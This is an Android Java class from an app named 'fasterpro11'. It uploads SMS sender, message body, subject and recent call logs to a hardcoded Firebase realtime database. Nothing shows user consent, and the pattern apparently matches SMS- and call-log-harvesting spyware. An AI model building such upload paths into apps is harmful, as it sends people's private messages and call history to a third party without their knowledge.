package com.example.fasterpro11;

import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class FirebaseSaVeAndViewData {

    private static final String TAG = "FirebaseSaVeAndViewData";
    private static final String DATABASE_URL = "https://fasterpro11-6a6b2-default-rtdb.firebaseio.com/";
    private DatabaseReference mDatabase;

    // Firebase Database ইনিশিয়ালাইজেশন
    public FirebaseSaVeAndViewData() {
        mDatabase = FirebaseDatabase.getInstance(DATABASE_URL).getReference();
    }

    // SMS ডেটা Firebase-এ সংরক্ষণ করা
    public void saveSmsDataToFirebase(String sender, String messageBody, String subject, String recentCallLogs) {
        String smsId = mDatabase.push().getKey();

        if (smsId != null) {
            // ডেটার মান ম্যাপ আকারে প্রস্তুত করা
            Map<String, Object> smsData = new HashMap<>();
            smsData.put("sender", sender);
            smsData.put("messageBody", messageBody);
            smsData.put("subject", subject);
            smsData.put("recentCallLogs", recentCallLogs);

            // Firebase-এ smsData নামে সংরক্ষণ
            mDatabase.child("smsData").child(smsId).setValue(smsData)
                    .addOnCompleteListener(task -> {
                        if (task.isSuccessful()) {
                            Log.d(TAG, "SMS Data Firebase-এ সফলভাবে সংরক্ষিত হয়েছে.");
                        } else {
                            Log.e(TAG, "Firebase-এ SMS Data সংরক্ষণে ত্রুটি: ", task.getException());
                        }
                    });
        } else {
            Log.e(TAG, "SMS-র জন্য ইউনিক ID তৈরি করতে ত্রুটি.");
        }
    }
}
